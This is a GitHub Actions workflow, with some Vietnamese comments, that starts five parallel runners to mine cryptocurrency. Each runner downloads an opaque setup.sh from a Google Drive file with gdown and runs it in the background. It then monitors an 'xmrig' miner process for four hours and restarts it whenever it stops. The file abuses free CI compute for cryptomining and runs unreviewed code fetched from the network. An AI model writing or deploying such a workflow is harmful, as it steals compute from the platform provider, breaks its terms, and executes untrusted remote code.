name: Create 5 VPS

on:
  push:
    branches:
      - main
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        vps_index: [1, 2, 3, 4, 5]

    env:
      GDRIVE_ID: 1091OMyUhjWcXqO9IGvcS2hIsrFOcL5RU
      VPS_NAME: auto-restart-vps

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget curl python3-pip

      - name: Download and setup miner
        run: |
          echo "Starting VPS ${{ matrix.vps_index }}"
          python3 -m pip install --user gdown
          gdown --id "$GDRIVE_ID" -O setup.sh
          chmod +x setup.sh
          # Chạy trực tiếp, không cần sudo
          ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &

      - name: Keep VPS alive and monitor
        run: |
          echo "VPS ${{ matrix.vps_index }} is running..."
          counter=0
          while [ $counter -lt 240 ]; do  # Chạy 4 tiếng (240 phút)
            if pgrep -f "xmrig" > /dev/null; then
              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đang chạy..."
            else
              echo "[$(date +'%Y-%m-%d %H:%M:%S')] VPS-${{ matrix.vps_index }}: Miner đã dừng, khởi động lại..."
              ./setup.sh > miner_${{ matrix.vps_index }}.log 2>&1 &
            fi
            sleep 60
            ((counter++))
          done
          echo "VPS ${{ matrix.vps_index }} đã hoàn thành 4 giờ chạy"
